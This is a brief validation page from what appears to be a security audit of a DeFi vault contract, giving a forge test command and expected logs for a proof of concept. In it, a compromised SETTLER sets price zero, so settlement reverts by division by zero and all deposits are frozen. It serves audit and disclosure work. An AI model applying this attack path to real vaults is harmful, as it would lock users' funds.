# POC-04 — Validation Steps

## Steps

```bash
cd dexalot-omnivault-audit
forge test --match-test testPOC04_ChainedSettlerAndUnwind -vvv
```

## Expected Output

```
[PASS] testPOC04_ChainedSettlerAndUnwind()
Logs:
  [+] Compromised SETTLER finalized batch 0 with price=0
  [EXPLOIT] bulkSettle on batch 0 reverts forever (div-by-zero)
  [EXPLOIT] Vault cannot advance to batch 1
  [EXPLOIT] All deposits and withdrawals permanently frozen
  [EXPLOIT] POC-04 CONFIRMED: vault paralyzed
```

## Proof

`vm.expectRevert()` confirms `bulkSettle` always reverts, and
`assertEq(status, UNWOUND)` shows the batch can only be force-unwound
after the attacker's 24h window — all funds already frozen inside.
